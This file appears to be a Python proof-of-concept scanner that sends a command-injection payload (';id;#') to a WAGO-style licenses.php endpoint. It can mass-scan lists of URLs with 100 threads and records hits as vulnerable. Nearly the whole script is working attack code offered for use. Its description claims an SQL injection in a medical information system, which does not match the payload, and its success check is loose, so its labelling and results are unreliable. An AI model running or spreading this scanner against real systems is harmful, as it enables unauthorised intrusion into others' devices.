import sys
import argparse
import requests
import logging
import re
import json
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()
# 设置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def banner():
    banner = r"""
  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|





                            version:1.1.0
                            author:fangwei     
    """
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="医药信息管理系统GetLshByTj存在SQL注入")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        logger.info(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = "/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php"
    headers = {
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,"
                      "likeGecko)Chrome/89.0.4389.114Safari/537.36",
        "Connection": "close",
        "Content-Length": "19",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip,deflate",
    }
    data = json.dumps({"package": ";id;#"})
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080",
    }
    try:
        res1 = requests.post(url=target + payload, data=data, headers=headers,verify=False, timeout=5)
        if res1.status_code == 200 and "id" in res1.text:
            logger.info(f"[+] {target} 存在漏洞")
            with open("WAGOre.txt", "a",encoding='utf-8') as f:
                f.write(target + "\n")
            return True
        else:
            logger.info(f"[-] {target} 不存在漏洞")
            return False
    except Exception as e:
        logger.error(f"[-] {target} 连接失败")
        return False


if __name__ == '__main__':
    main()
